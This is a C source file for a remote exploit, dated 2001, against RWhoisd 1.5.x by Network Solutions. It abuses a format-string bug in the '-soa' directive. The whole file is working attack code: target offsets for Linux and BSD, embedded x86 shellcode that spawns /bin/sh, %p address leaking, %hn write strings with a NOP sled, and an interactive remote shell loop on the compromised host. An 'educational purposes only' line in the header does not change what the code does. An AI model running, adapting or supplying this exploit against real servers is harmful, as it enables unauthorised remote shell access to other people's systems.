/* 
       17.4.2001        

       Remote Exploit for versions of
       RWhoisd ... (by Network Solutions, Inc. V-1.5.x) 
      
       this code exploits a bug in the '-soa' directive 
       that calls print_error() with a user supplied 
       format string.

       credit to rob who found the h0le 
       and mad thanks to all the people who helped me
       test this code.       

       these versions are vulnerable on all platforms
       not only the ones available here.

       you better try more than once , for some reason
       if sometimes fails on first attempts.

       THIS CODE IS FOR EDUCATIONAL PURPOSES ONLY
       
       have phun, CowPower.
       
*/

#include <signal.h>
#include <stdlib.h>
#include <stdio.h>
#include <sys/socket.h>
#include <sys/types.h>
#include <netinet/in.h>
#include <netdb.h>

#define VERSION                        2.0
#define MAX(x,y)	((x>y)?x:y)
#define PORT			       4321

#define BUFF			       251
#define LEN			       1024


struct version {
        char *name;
	int ret;
        int ret1;
	int str;
};

struct version version[] = { 

      {	"Linux x86 (execpt Slack 8.x)",-185,-233,-5 } ,
      { "Linux x86 (Slackware 8.x)",56,-40,324 } ,              
      { "FreeBSD (version < 4.x)",-189,-237,-5 } ,
      { "OpenBSD, FreeBSD 4.x",56,-40,324 } , 
 			0
};

/*  modified shellcodes who contain no nasty control chars (<=0x20)  */

char *evilcode[] = {

"\x31\xc0\x31\xdb\x31\xc9\x43\x41\x41\xb0\x3f\xcd\x80"
"\xeb\x25\x5e\x89\xf3\x83\xc3\xe0\x89\x73\x28\x31\xc0\x88\x43\x27\x89\x43"
"\x2c\x83\xe8\xf5\x8d\x4b\x28\x8d\x53\x2c\x89\xf3\xcd\x80\x31\xdb\x89\xd8"
"\x40\xcd\x80\xe8\xd6\xff\xff\xff/bin/sh"  ,

"same as linux shellcode" , 

"\x31\xc0\x2c\xfe\x50\xfe\xc8\x50\x50\x2c\xa7\xcd\x80"
"\xeb\x2a\x5e\x8d\x5e\xe0\x89\x73\x2b\x31\xd2\x89\x53\x27\x89\x53\x2f"
"\x89\x53\x34\x88\x53\x39\x31\xc0\xb0\x3b\x8d\x4b\x2b\x80\x6b\x38\x30"
"\x80\x6e\xfa\x30\x51\x51\x56\x50\xeb\x48\xe8\xd1\xff\xff\xff/bin/sh"
"xxxxxxxxxxxx" "\x9a"  "xxxx"  "\x37"  "x"  , 

  "same as freebsd shellcode" , 
  
} ;

char *shellcode;
unsigned long int ret,mem;
int ver;

void *err(char *);
void *intr(void);
void *timeout(void);
int ok(void);
char *answer(char *,char *,int,int);
char *makeadd(unsigned long int,int,char *);
char *makebuf(int,char *,int);


 main(int argc, char **argv) {
    
        char sendln[LEN], recvln[LEN],*ptr;
        int i,sockfd, maxfd, bsize;
        struct sockaddr_in cli;
        struct hostent *hp;
        fd_set rset;


	fprintf(stderr,"RWhoisd remote exploit v%.1f by Moo0\n",VERSION);
     
     maxfd = (sizeof(version) / sizeof(version[0])) - 2;

         if (argc < 3) {
		fprintf(stderr,"usage: %s <host> <version number>
				\ravailable support:\n",argv[0]);
		for (i=0;version[i].name;i++)
			fprintf(stderr,"(%d)\t%s\n",i,version[i].name);
	        exit(-1);
   }
    
    for(i=0;argv[2][i];i++) if (!isdigit(argv[2][i])) 
	err("version not available.\n");

 ver = atoi(argv[2]);
      if (!(ver <= maxfd))  err("version not available.\n");
	

signal(SIGINT,(void *)intr);
signal(SIGALRM,(void *)timeout);

evilcode[1] = evilcode[0]; 
evilcode[3] = evilcode[2];

shellcode = evilcode[ver];	   

   fprintf(stderr,"Target: %s\n\
Operating System: %s\n",argv[1],version[ver].name);

        if((sockfd = socket(AF_INET, SOCK_STREAM, 0)) < 0){
                perror("Socket");
                exit(-1);  }

        if((hp = gethostbyname(argv[1])) == NULL){
                printf("Error: %s\n", hstrerror(h_errno));
                exit(-1);
        }

      fputs("Connecting to RWhoisd....",stderr);
  
     bzero(&cli, sizeof(cli));

        cli.sin_family = AF_INET;
        cli.sin_port = htons(PORT);
        memcpy((char *)&cli.sin_addr, hp->h_addr_list[0], hp->h_length);
        if(connect(sockfd, (struct sockaddr *)&cli, sizeof(cli)) < 0){
                perror("");
                exit(-1);
        }

  answer(0,recvln,sockfd,0);

    
     for (i=0;i<8;i++) recvln[i] = tolower(recvln[i]);        

       if(strncmp(recvln,"%rwhois",7)) 
     err("Connected,\nBut its not RWhoisd, Aborting.\n"); 
 
       fputs("Connected.\n",stderr);
      sleep(1);
       fputs("Building evil-string:\n",stderr);
    
       strcpy(sendln,"-soa %p\n");

        answer(sendln,recvln,sockfd,0);

     if (strcmp(recvln,"%error 340 Invalid Authority Area")) 
       err("Cant read necessary data.\n");

else {
        answer(sendln,recvln,sockfd,1);
        ptr = (char *)strstr(recvln,"0x") ;
	if (!ptr) err("Data doesnt match verison given.\n");
   }
        mem = strtoul(ptr,(void *)0,16);

        ret = ((mem+version[ver].ret)&0xff)>0x20?(mem+version[ver].ret):
	(mem+version[ver].ret1);

        if (!ok()) err("Impossible Conditions, Aborting.\n");


        fprintf(stderr,"Assumed EIP Address: %#x\n",ret);

	answer(makebuf(BUFF,recvln,1),recvln,sockfd,1);

        ptr = (char *)strstr(recvln,"78787800")  ;      
       

       if(!ptr) err(0);

       bsize = BUFF - (strlen(ptr) / 4) ;

        mem +=  version[ver].str + bsize + 8 + (3*6) + (3*3);                

       fprintf(stderr,"Assumed shellcode address: %#x\n",mem);
       maxfd = ( strlen(recvln) - strlen(ptr) + 6 ) & 0xff ;

       makebuf(bsize,sendln,0);  
       makeadd(mem,maxfd,recvln); 

       sendln[strlen(sendln)-1] = '\0';
       strcat(sendln,recvln);

     answer(sendln,recvln,sockfd,1);

     ptr = (char *)strstr(recvln,"xxx") ;

        if (!ptr) err(0); 

      *((char *)strstr(ptr,"78787800")+8) = '\0';

     i = ((strlen(ptr)) & 0xff) -  (mem & 0xff) ;


        makebuf(bsize,sendln,1); makeadd(mem,maxfd+i,recvln);
        sendln[strlen(sendln)-1] = '\0';
        strcat(sendln,recvln);  

      fputs("Sending evil-string , Waiting for Response....",stderr);

     answer(sendln,recvln,sockfd,1);

       answer("echo -n \"oink\";\n",recvln,sockfd,0);

        if (strcmp(recvln,"oink"))  { 
	     answer(0,recvln,sockfd,0);
             if (strcmp(recvln,"oink")) err(0);	}

        fputs("Success!\n",stderr);        

        strcpy(sendln,"uname -a;\n");
        write(sockfd,sendln,strlen(sendln));
        sleep(1);
        fputs(sendln,stderr);

      signal(SIGINT,SIG_IGN);

       bzero(sendln, LEN);

        FD_ZERO(&rset);
        for(;;){
                FD_SET(fileno(stdin), &rset);
                FD_SET(sockfd, &rset);
                maxfd = MAX(fileno(stdin), sockfd) + 1;
                select(maxfd, &rset, NULL, NULL, NULL);
                if(FD_ISSET(fileno(stdin), &rset)){

                        fgets(sendln, sizeof(sendln)-2, stdin);
                        write(sockfd, sendln, strlen(sendln));
 			bzero(sendln, LEN);
 
               }
                if(FD_ISSET(sockfd, &rset)){
                        bzero(recvln, LEN);
                        if(
      (i = read(sockfd, recvln, sizeof(recvln)))== 0){
                     printf("hackerz.\n");
                                exit(0);
                        }
                        if(i < 0){
                                perror("read");
                                exit(-1);
                        }
                        fputs(recvln, stdout);
                }
        }
}


char *makebuf(int len,char *buf,int real)  {

	char *buff,*ptr;
        unsigned long addr;
	int i;

bzero(buff = malloc(len),len);

 for (i = 0; i < len-1; i+=2) strcat(buff,"%x");

if (real) addr = ret;

else addr = (mem & 0xff)>0x20?mem:mem+33;

ptr = buff;

   *(ptr++) =   (addr & 0xff) ;
   *(ptr++) =  (addr & 0xff00) >> 8 ;
   *(ptr++) =  (addr & 0xff0000) >> 16 ;
   *(ptr++) =  (addr & 0xff000000) >> 24 ;
  
 memcpy(ptr,"AAAA",4);

ptr += 4;

i = 3;

while (i--) {
    
   addr++;

   *(ptr++) =   (addr & 0xff) ;
   *(ptr++) =  (addr & 0xff00) >> 8 ;
   *(ptr++) =  (addr & 0xff0000) >> 16 ;
   *(ptr++) =  (addr & 0xff000000) >> 24 ;
}


sprintf(buf,"-soa xxx%s\n",buff);

free(buff);
return(buf);
  
}

char *makeadd(unsigned long int mem,int us,char *add) {

       char almog[400],sendln[100],*ptr;
      int maxfd,goal;
   
	   goal = (mem & 0xff);

        maxfd = (goal - us)<0?(goal+256-us):(goal-us);

        sprintf(add,"%%.%dx%s",maxfd+8,"%hn");

        us = goal+ 8;
        goal =  (mem & 0xff00) >> 8 ;

      maxfd = (goal - us)<0?(goal+256-us):(goal-us);

       sprintf(add,"%s%%.%dx%s",add,maxfd+8,"%hn");

       memset(almog,'\x90',300);
       almog[300] = '\0';
        

        us = goal ;
        goal =  (mem & 0xff0000) >> 16 ;

       maxfd = (goal - us)<0?(goal+256-us):(goal-us);

       sprintf(sendln,"%%s%%.%ds",maxfd);

if (ver > 1) {
       ptr = almog + (maxfd - strlen(shellcode));

      memcpy(ptr,shellcode,strlen(shellcode));

	}

      sprintf(add,sendln,add,almog);

      strcat(add,"%hn");

      us = goal ;
      goal =  (mem & 0xff000000) >> 24 ;

    maxfd = (goal - us)<0?(goal+256-us):(goal-us);

       sprintf(sendln,"%%s%%.%ds",maxfd);

if (ver <= 1) {   
      ptr = almog + (maxfd - strlen(shellcode));

      memcpy(ptr,shellcode,strlen(shellcode));
	}
     sprintf(add,sendln,add,almog);
        strcat(add,"%hn\n");

 return(add);

}


char *answer(char *sendln,char *recvln,int sockfd,int extra) {

       alarm(15);  
      if (sendln) write(sockfd,sendln,strlen(sendln));
      if (extra) read(sockfd,recvln,LEN) ;
        bzero(recvln, LEN);
        read(sockfd,recvln,LEN) ;

      alarm(0);
      return(recvln);

}


void *intr(void) {

fflush(stdout);

fputs("\nInterruption from keyboard...aborting.\n",stderr);

exit(-1);

}

void *timeout(void) {

fputs("Timeout!\n",stderr);

exit(-1);
}



int ok(void) {

if (     ((ret & 0xff) > 0x20)
     &&	(((ret & 0xff00) >> 8) > 0x20) 
     && (((ret & 0xff0000) >> 16) > 0x20)
     && (((ret & 0xff000000) >> 24)  > 0x20) ) return(1);

return(0);

}

void *err(char *msg) {

if (msg) fputs(msg,stderr);
else fputs("Failed.\n",stderr);

exit(-1);

}

